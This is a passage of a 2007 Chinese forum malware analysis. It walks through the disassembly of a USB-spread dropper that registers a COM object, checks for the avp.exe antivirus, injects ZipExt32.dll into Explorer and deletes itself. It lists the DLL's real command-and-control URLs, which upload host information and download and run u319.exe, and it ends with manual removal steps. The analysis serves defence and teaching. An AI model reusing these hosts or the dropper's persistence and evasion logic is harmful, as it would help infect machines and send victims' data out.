>   0040179C  |.  FF15 70204000 CALL DWORD PTR DS:\[&lt;&kernel32.MoveFileA&gt;; \\MoveFileA  
>   004017A2  |.  E8 89FCFFFF   CALL UnPack\_D.00401430                  ;  先。删除以前生成的相关 dll，再释放资源 ceo 到 C:\\windows\\Downloaded Program Files\\ZipExt32.dll  
>   004017A7  |.  E8 84FEFFFF   CALL UnPack\_D.00401630                  ;  释放资源 hiv 到 c:\\tmp.hiv,执行完他的任务，去死  
>   004017AC  |.  8B1D 18204000 MOV EBX,DWORD PTR DS:\[&lt;&advapi32.RegCre&gt;;  advapi32.RegCreateKeyA  
>   004017B2  |.  8D4C24 0C     LEA ECX,DWORD PTR SS:\[ESP+C\]  
>   004017B6  |.  51            PUSH ECX                                ; /pHandle  
>   004017B7  |.  68 E0224000   PUSH UnPack\_D.004022E0                  ; |Subkey = "CLSID\\{35CEC8A3-2BE6-11D2-8773-92E220524140}"  
>   004017BC  |.  68 00000080   PUSH 80000000                           ; |hKey = HKEY\_CLASSES\_ROOT  
>   004017C1  |.  FFD3          CALL EBX                                ; \\RegCreateKeyA  
>   004017C3  |.  8B35 6C204000 MOV ESI,DWORD PTR DS:\[&lt;&kernel32.lstrle&gt;;  建立 CLSID\\{35CEC8A3-2BE6-11D2-8773-92E220524140}  
>   004017C9  |.  68 D4224000   PUSH UnPack\_D.004022D4                  ; /String = "ZipExt32"  
>   004017CE  |.  FFD6          CALL ESI                                ; \\lstrlenA  
>   004017D0  |.  8B5424 0C     MOV EDX,DWORD PTR SS:\[ESP+C\]  
>   004017D4  |.  8B3D 14204000 MOV EDI,DWORD PTR DS:\[&lt;&advapi32.RegSet&gt;;  advapi32.RegSetValueExA  
>   004017DA  |.  50            PUSH EAX                                ; /BufSize  
>   004017DB  |.  68 D4224000   PUSH UnPack\_D.004022D4                  ; |Buffer = UnPack\_D.004022D4  
>   004017E0  |.  6A 01         PUSH 1                                  ; |ValueType = REG\_SZ  
>   004017E2  |.  6A 00         PUSH 0                                  ; |Reserved = 0  
>   004017E4  |.  68 D0224000   PUSH UnPack\_D.004022D0                  ; |ValueName = ""  
>   004017E9  |.  52            PUSH EDX                                ; |hKey  
>   004017EA  |.  FFD7          CALL EDI                                ; \\RegSetValueExA  
>   004017EC  |.  8B4424 0C     MOV EAX,DWORD PTR SS:\[ESP+C\]  
>   004017F0  |.  50            PUSH EAX                                ; /hKey  
>   004017F1  |.  FF15 10204000 CALL DWORD PTR DS:\[&lt;&advapi32.RegCloseK&gt;; \\RegCloseKey  
>   004017F7  |.  8D4C24 0C     LEA ECX,DWORD PTR SS:\[ESP+C\]  
>   004017FB  |.  51            PUSH ECX                                ; /pHandle  
>   004017FC  |.  68 94224000   PUSH UnPack\_D.00402294                  ; |Subkey = "CLSID\\{35CEC8A3-2BE6-11D2-8773-92E220524140}\\InprocServer32"  
>   00401801  |.  68 00000080   PUSH 80000000                           ; |hKey = HKEY\_CLASSES\_ROOT  
>   00401806  |.  FFD3          CALL EBX                                ; \\RegCreateKeyA  
>   00401808  |.  8D5424 10     LEA EDX,DWORD PTR SS:\[ESP+10\]           ;  以下是 建立 CLSID\\{35CEC8A3-2BE6-11D2-8773-92E220524140}等与之关联项目  
>   0040180C  |.  52            PUSH EDX                                ; /String  
>   0040180D  |.  FFD6          CALL ESI                                ; \\lstrlenA  
>   0040180F  |.  8B4C24 0C     MOV ECX,DWORD PTR SS:\[ESP+C\]  
>   00401813  |.  50            PUSH EAX                                ; /BufSize  
>   00401814  |.  8D4424 14     LEA EAX,DWORD PTR SS:\[ESP+14\]           ; |  
>   00401818  |.  50            PUSH EAX                                ; |Buffer  
>   00401819  |.  6A 01         PUSH 1                                  ; |ValueType = REG\_SZ  
>   0040181B  |.  6A 00         PUSH 0                                  ; |Reserved = 0  
>   0040181D  |.  68 D0224000   PUSH UnPack\_D.004022D0                  ; |ValueName = ""  
>   00401822  |.  51            PUSH ECX                                ; |hKey  
>   00401823  |.  FFD7          CALL EDI                                ; \\RegSetValueExA  
>   00401825  |.  68 8C224000   PUSH UnPack\_D.0040228C                  ; /String = "Both"  
>   0040182A  |.  FFD6          CALL ESI                                ; \\lstrlenA  
>   0040182C  |.  8B5424 0C     MOV EDX,DWORD PTR SS:\[ESP+C\]  
>   00401830  |.  50            PUSH EAX                                ; /BufSize  
>   00401831  |.  68 8C224000   PUSH UnPack\_D.0040228C                  ; |Buffer = UnPack\_D.0040228C  
>   00401836  |.  6A 01         PUSH 1                                  ; |ValueType = REG\_SZ  
>   00401838  |.  6A 00         PUSH 0                                  ; |Reserved = 0  
>   0040183A  |.  68 7C224000   PUSH UnPack\_D.0040227C                  ; |ValueName = "ThreadingModel"  
>   0040183F  |.  52            PUSH EDX                                ; |hKey  
>   00401840  |.  FFD7          CALL EDI                                ; \\RegSetValueExA  
>   00401842  |.  8B4424 0C     MOV EAX,DWORD PTR SS:\[ESP+C\]  
>   00401846  |.  50            PUSH EAX                                ; /hKey  
>   00401847  |.  FF15 10204000 CALL DWORD PTR DS:\[&lt;&advapi32.RegCloseK&gt;; \\RegCloseKey  
>   0040184D  |.  E8 AEF7FFFF   CALL UnPack\_D.00401000                  ;  检测是否有 avp.exe  
>   00401852  |.  84C0          TEST AL,AL  
>   00401854  |.  74 2E         JE SHORT UnPack\_D.00401884  
>   00401856  |.  8B4D 08       MOV ECX,DWORD PTR SS:\[EBP+8\]            ;  有的话，那就  
>   00401859  |.  6A 05         PUSH 5                                  ; /ShowState = SW\_SHOW  
>   0040185B  |.  6A 00         PUSH 0                                  ; |/lParam = 0  
>   0040185D  |.  68 F0134000   PUSH UnPack\_D.004013F0                  ; ||pDlgProc = UnPack\_D.004013F0  
>   00401862  |.  6A 00         PUSH 0                                  ; ||hOwner = NULL  
>   00401864  |.  6A 6C         PUSH 6C                                 ; ||pTemplate = 6C  
>   00401866  |.  51            PUSH ECX                                ; ||hInst  
>   00401867  |.  FF15 E0204000 CALL DWORD PTR DS:\[&lt;&user32.CreateDialo&gt;; |\\CreateDialogParamA  
>   0040186D  |.  50            PUSH EAX                                ; |hWnd  
>   0040186E  |.  FF15 E4204000 CALL DWORD PTR DS:\[&lt;&user32.ShowWindow&gt;&gt;; \\ShowWindow  
>   00401874  |.  E8 F7F7FFFF   CALL UnPack\_D.00401070                  ;  又要利用 sysret.dat 重启电脑  
>   00401879  |.  68 E8030000   PUSH 3E8                                ; /Timeout = 1000. ms  
>   0040187E  |.  FF15 2C204000 CALL DWORD PTR DS:\[&lt;&kernel32.Sleep&gt;\]   ; \\Sleep  
>   00401884  |&gt;  E8 97F9FFFF   CALL UnPack\_D.00401220                  ;  加载 zipext32.dll 到 Explorer  
>   00401889  |.  E8 62F8FFFF   CALL UnPack\_D.004010F0                  ;  在临时文件夹里面船舰 7ztmp.bat ,写入删除该程序的批处理，并运行  
>   0040188E  |.  5F            POP EDI                                 ;  ntdll.7C930738  
>   0040188F  |.  5E            POP ESI  
>   00401890  |.  33C0          XOR EAX,EAX  
>   00401892  |.  5B            POP EBX  
>   00401893  |.  8BE5          MOV ESP,EBP  
>   00401895  |.  5D            POP EBP  
>   00401896  \\.  C2 1000       RETN 10  
>     
>     
>     
>   ======================================================================  
>   00401000  /$  81EC 28010000 SUB ESP,128  
>   00401006  |.  56            PUSH ESI  
>   00401007  |.  57            PUSH EDI  
>   00401008  |.  6A 00         PUSH 0                                ; /ProcessID = 0  
>   0040100A  |.  6A 02         PUSH 2                                ; |Flags = TH32CS\_SNAPPROCESS  
>   0040100C  |.  E8 95080000   CALL &lt;JMP.&kernel32.CreateToolhelp32S&gt;; \\CreateToolhelp32Snapshot  
>   00401011  |.  8BF8          MOV EDI,EAX                           ;  建立系统进程列表句柄  
>   00401013  |.  8D4424 08     LEA EAX,DWORD PTR SS:\[ESP+8\]  
>   00401017  |.  50            PUSH EAX                              ; /pProcessentry  
>   00401018  |.  57            PUSH EDI                              ; |hSnapshot  
>   00401019  |.  C74424 10 280&gt;MOV DWORD PTR SS:\[ESP+10\],128         ; |  
>   00401021  |.  E8 7A080000   CALL &lt;JMP.&kernel32.Process32First&gt;   ; \\Process32First  
>   00401026  |.  85C0          TEST EAX,EAX                          ;  枚举进程呼？  
>   00401028  |.  74 28         JE SHORT UnPack\_D.00401052  
>   0040102A  |.  8B35 A4204000 MOV ESI,DWORD PTR DS:\[&lt;&msvcrt.\_strcm&gt;;  msvcrt.\_stricmp  
>   00401030  |&gt;  8D4C24 2C     /LEA ECX,DWORD PTR SS:\[ESP+2C\]  
>   00401034  |.  68 1C214000   |PUSH UnPack\_D.0040211C               ;  ASCII "avp.exe"  
>   00401039  |.  51            |PUSH ECX  
>   0040103A  |.  FFD6          |CALL ESI  
>   0040103C  |.  83C4 08       |ADD ESP,8  
>   0040103F  |.  85C0          |TEST EAX,EAX  
>   00401041  |.  74 1A         |JE SHORT UnPack\_D.0040105D  
>   00401043  |.  8D5424 08     |LEA EDX,DWORD PTR SS:\[ESP+8\]  
>   00401047  |.  52            |PUSH EDX                             ; /pProcessentry  
>   00401048  |.  57            |PUSH EDI                             ; |hSnapshot  
>   00401049  |.  E8 4C080000   |CALL &lt;JMP.&kernel32.Process32Next&gt;   ; \\Process32Next  
>   0040104E  |.  85C0          |TEST EAX,EAX  
>   00401050  |.^ 75 DE         \\JNZ SHORT UnPack\_D.00401030  
>   00401052  |&gt;  5F            POP EDI                               ;  慢慢列举吧你·~  
>   00401053  |.  32C0          XOR AL,AL  
>   00401055  |.  5E            POP ESI  
>   00401056  |.  81C4 28010000 ADD ESP,128  
>   0040105C  |.  C3            RETN  
>   0040105D  |&gt;  5F            POP EDI  
>   0040105E  |.  B0 01         MOV AL,1  
>   00401060  |.  5E            POP ESI  
>   00401061  |.  81C4 28010000 ADD ESP,128  
>   00401067  \\.  C3            RETN  
>     
>     
>   =================================================================================================  
>   第五步：看似木马程序的 ZipExt32.dll  
>     
>   哦？  
>   还是懒得分析~  
>     
>   简单看了一下  
>   这个 dll 类似于木马下载者  
>     
>   功能大致：  
>     
>   1.  
>   下载 http://www.black163.com/mm/cfg2.txt 到 C:\\z.ini  
>     --从这个名字来看，应该是配置文件  
>     
>   2.  
>   http://www.black163.com/mm/dg1/log.asp?isnew=1&LocalInfo=%s&szHostName=%s&tmp3=tmp3  
>   http://www.black163.com/mm/dg1/log.asp?isnew=0&LocalInfo=%s&szHostName=%s&tmp3=tmp3  
>     
>     
>   LocalInfo=应该是本地信息  
>   zHostName=主机名字？  
>   大致是将本地及其参数发到 网上去  
>     --呵呵，怎么感觉 像是 通过 web 控制的 木马饿~  
>     
>   3.  
>   http://www.black163.com/u319.exe  
>   http://mm.black163.com/u319.exe  
>   想都不想，肯定下载 u319.exe 并运行~  
>     --可能是类似木马升级吧，当然肯定，运行后也会把屁股擦了，删除垃圾文件.  
>     
>   4.  
>   wsctny1.exe  
>   wsctny2.exe  
>   wsctny1.tmp  
>   应该都是 运行的文件名字吧~  
>     
>     
>     
>   最后加一句  
>   卑鄙卑鄙...........  
>   Alexander Roshal  
>   伪装成 Alex 签名...  
>   反正不管怎么说，里面有马................  
>     
>     
>   =================================================================================================  
>   第六步：完，分析就到这里了，其实那个 Sys 偶很想去分析的啦。可以不会  
>     
>     
>   =================================================================================================  
>   最后帖手动解决方案：  
>     
>   首先，卸载所有移动存储设备 进入安全模式，所有驱动器用右键鼠标打开：  
>   1.  
>   如果有以下文件请删除  
>     
>     
>   c:\\tmp.hiv  
>   C:\\sysret.dat  
>   C:\\sysret.sys  
>   system32\\AceExt32.dll  
>   windows\\Downloaded Program Files\\Ext32.dat  
>   windows\\Downloaded Program Files\\Ext32.dll  
>   windows\\Downloaded Program Files\\ZipExt32.dll  
>   windows\\Downloaded Program Files\\CxUSBKey.exe  
>     
>   2.  
>   删除注册表  
>     
>   SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\ShellServiceObjectDelayLoad  
>   下面 带有 AceExt32.dll 和 ZipExt32.dll 的请删了  
>     
>   HKEY\_LOCAL\_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\SM\_GameDro  
>     
>   HKEY\_CLASSES\_ROOT\\CLSID\\{35CEC8A3-2BE6-11D2-8773-92E220524150}  
>   HKEY\_CLASSES\_ROOT\\CLSID\\{35CEC8A3-2BE6-11D2-8773-92E220524140}  
>     
>   3.  
>   关闭自动运行  
>     
>   开始-》运行-》Gpedit.msc-》计算机配置-》管理模块-》系统-》关闭自动播放-》已启动-》所有驱动器-》确定 OK~  
>     
>   4.  
>   插入移动存储器，鼠标右键打开  
>   删除里面的病毒程序  
>     
>   X:\\RECYCLER\\UcHelp.exe  
>   X:\\RECYCLER\\desktop.ini  
>   X:\\autorun.inf  
>     
>   重启电脑应该就没有事了！  
>     
>   BTW：  
>   当然你不愿意进安全模式，那么强行卸载 Explorer 中那两个 刀 AceExt32.dll，ZipExt32.dll，  
>   再去删除那些文件，清理那些注册表也是可以的。  
>     
> \--------------------------------------------------------------------------------  
> 【经验总结】  
>   1. 第一次分析病毒程序，感觉怕怕，为此我还装了影子系统  
>   2. 感谢 恶灵骑士 MJ0011 介绍 sysret.sys 的工作机理  
>   3. 感谢 xyzreg 大虾提供的强奸注册表 Pass HIPS-RD 方法  
>   4. 好了，我可以去吐血了~  
>     
> \--------------------------------------------------------------------------------  
> 【版权声明】: 本文原创于看雪技术论坛, 转载请注明作者并保持文章的完整, 谢谢!  
>   
>                                                        2007 年 06 月 03 日 上午 10:20:04 

 4dd466d0e1e0cc123afbe504da2462ca